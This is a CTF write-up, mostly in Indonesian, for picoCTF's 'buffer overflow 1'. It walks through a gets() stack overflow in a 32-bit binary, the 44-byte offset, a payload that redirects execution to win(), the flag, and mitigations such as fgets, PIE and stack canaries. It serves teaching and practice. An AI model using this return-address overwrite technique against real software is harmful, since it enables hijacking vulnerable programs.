# Writeup: buffer overflow 1 (Challenge ID: 258)

- Platform: CyLab Security Academy (picoCTF)
- Category: Binary Exploitation / Control Flow Hijacking via EIP Return Pointer Overwrite
- Difficulty: Medium (diff=2)
- Author: Sanjay C / LT 'syreal' Jones
- Event: picoCTF 2022
- Points: 200
- Flag: `academy{addr3ss3s_ar3_3asy_b53c45d8}` (Komunitas: `CTF{addr3ss3s_ar3_3asy_b53c45d8}`)

---

## Problem Statement & Scope

Tantangan menguji penguasaan teknik pembajakan alur eksekusi (*control flow hijacking*) pada arsitektur x86 32-bit:
> *"Control the return address. Now we're cooking! You can overflow the buffer and return to the flag function in the program. You can view source here. And connect with it using `nc xebec.cylabacademy.net <port>`"*

Peserta dibekali biner ELF 32-bit tanpa proteksi Stack Canary maupun PIE, berkas kode sumber C (`vuln.c`), serta layanan jaringan interaktif. Target uji kompetensi adalah menghitung offset tumpukan secara presisi dari buffer lokal menuju *saved return address* (%eip), lalu membelokkan alur eksekusi menuju fungsi target `win()` yang mencetak bendera rahasia.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Ketiadaan Batas Masukan pada Fungsi `gets()` (CWE-121 & CWE-676):**
   - Dalam kode sumber `vuln.c`, fungsi `vuln()` mengalokasikan array karakter lokal dengan kapasitas terbatas:
     ```c
     #define BUFSIZE 32
     void vuln(){
       char buf[BUFSIZE];
       gets(buf);
       printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
     }
     ```
   - Karena fungsi `gets()` tidak membatasi kuantitas karakter yang dibaca dari masukan standar, penyerang dapat menyuplai string arbitrary yang melampaui batas 32 bita.

2. **Tata Letak Memori Frame Tumpukan 32-Bit (Stack Frame Layout):**
   - Melalui pembongkaran biner (*disassembly*) pada fungsi `vuln`:
     ```text
     0804926d <vuln>:
      804926d:  push   %ebp
      804926e:  mov    %esp,%ebp
      8049270:  push   %ebx
      8049271:  sub    $0x24,%esp
      ...
      8049282:  lea    -0x28(%ebp),%eax
      8049285:  push   %eax
      8049286:  call   8049050 <gets@plt>
     ```
   - Buffer masukan `buf` berada pada alamat `ebp - 0x28` (desimal: 40 bita sebelum pointer basis frame `%ebp`).
   - Saved frame pointer `%ebp` berukuran 4 bita (dari offset 40 hingga 43).
   - Saved instruction pointer (*return address* / `%eip`) tersimpan tepat di atas `%ebp` pada offset 44 bita dari pangkal buffer masukan.

3. **Pembajakan Alur Kontrol Menuju Fungsi `win()`:**
   - Analisis tabel simbol biner (`nm vuln` atau `objdump -d vuln`) mengungkapkan alamat statis fungsi `win()`:
     ```text
     080491e6 T win
     ```
   - Fungsi `win()` membuka dan mencetak berkas `flag.txt`:
     ```c
     void win() {
       char buf[FLAGSIZE];
       FILE *f = fopen("flag.txt","r");
       ...
       fgets(buf,FLAGSIZE,f);
       printf(buf);
     }
     ```
   - Karena biner tidak dikompilasi dengan Position Independent Executable (PIE), alamat `0x080491e6` bersifat deterministik dan tetap pada setiap siklus eksekusi.
   - Sesuai konvensi endianness arsitektur Intel x86 (Little-Endian), nilai `0x080491e6` harus dikemas dalam urutan bita terbalik: `\xe6\x91\x04\x08`.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Inspeksi Mitigasi Biner:**
   - Jalankan pemeriksaan mitigasi:
     ```bash
     checksec --file=vuln
     ```
   - Konfigurasi mitigasi:
     - Canary: No
     - NX: Yes (Data Execution Prevention aktif, injeksi shellcode diblokir)
     - PIE: No (Alamat biner statis pada ruang memori 0x08048000)
     - RelRO: Partial RelRO

2. **Penyusunan Muatan Eksploitasi (Payload Construction):**
   - Panjang padding sebelum `%eip`: 44 bita (`b"A" * 44`).
   - Alamat target fungsi `win()`: `0x080491e6` (`\xe6\x91\x04\x08`).
   - Muatan lengkap:
     ```python
     payload = b"A" * 44 + b"\xe6\x91\x04\x08" + b"\n"
     ```

3. **Injeksi Terhadap Layanan Jaringan Jarak Jauh:**
   - Hubungkan soket ke target:
     ```bash
     nc xebec.cylabacademy.net 31602
     ```
   - Kirimkan muatan biner. Layanan memproses masukan dan mengonfirmasi lompatan alamat:
     ```text
     Please enter your string: 
     Okay, time to return... Fingers Crossed... Jumping to 0x80491e6
     academy{addr3ss3s_ar3_3asy_b53c45d8}
     ```

---

## Flag & Verifikasi

- **Flag Resmi:** `academy{addr3ss3s_ar3_3asy_b53c45d8}`
- **Flag Komunitas:** `CTF{addr3ss3s_ar3_3asy_b53c45d8}`
- **Bukti Validasi:** REST API CyLab `POST /api/submissions/` merespons dengan status HTTP 201 Created:
  ```json
  {"user": 1072359, "challenge": 258, "flag": "academy{addr3ss3s_ar3_3asy_b53c45d8}", "correct": true, "historical": false}
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Pencegahan Eksploitasi Return Pointer:**
   - Selalu gunakan pembacaan masukan aman dengan penentuan ukuran maksimal melalui `fgets(buf, sizeof(buf), stdin)`.
2. **Implementasi Kompilasi PIE (Position Independent Executable):**
   - Kompilasi biner dengan parameter `-fPIE -pie`. Dengan PIE dan ASLR kernel, basis segmen kode akan diacak secara dinamis pada setiap pemuatan proses, mencegah penyerang menargetkan alamat fungsi secara hardcoded.
3. **Penerapan Stack Canaries & Shadow Stack:**
   - Aktifkan flag kompiler `-fstack-protector-strong`. Nilai canary yang diletakkan di antara buffer dan `%ebp` akan divalidasi sebelum instruksi `ret`, membatalkan eksekusi seketika saat terdeteksi modifikasi tumpukan.

---

## Solver Script

Solusi reproduktif terverifikasi tersedia pada:
`scripts/solve_258_buffer_overflow_1.py`
